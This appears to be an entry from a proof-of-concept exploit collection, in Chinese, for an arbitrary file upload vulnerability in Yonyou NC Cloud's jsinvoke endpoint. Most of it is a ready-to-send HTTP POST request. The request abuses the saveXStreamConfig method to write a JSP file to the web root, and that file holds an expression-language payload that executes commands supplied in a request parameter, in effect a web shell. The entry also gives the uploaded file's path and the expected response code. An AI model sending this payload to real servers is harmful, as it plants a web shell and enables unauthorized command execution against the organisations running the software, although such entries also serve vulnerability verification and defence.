﻿# 用友 NC Cloud jsinvoke 任意文件上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：https://blog.csdn.net/qq_56698744/article/details/131943659

> 漏洞特征：

> 验证脚本：HTTP

```
POST /uapjs/jsinvoke/?action=invoke  HTTP/1.1
Content-Type: application/json

{
  "serviceName": "nc.itf.iufo.IBaseSPService",
  "methodName": "saveXStreamConfig",
  "parameterTypes": [
    "java.lang.Object",
    "java.lang.String"
  ],
  "parameters": [
    "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
    "webapps/nc_web/407.jsp"
  ]
}
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：/407.jsp

> 验证文件来源：用友 NC Cloud jsinvoke 任意文件上传漏洞.poc
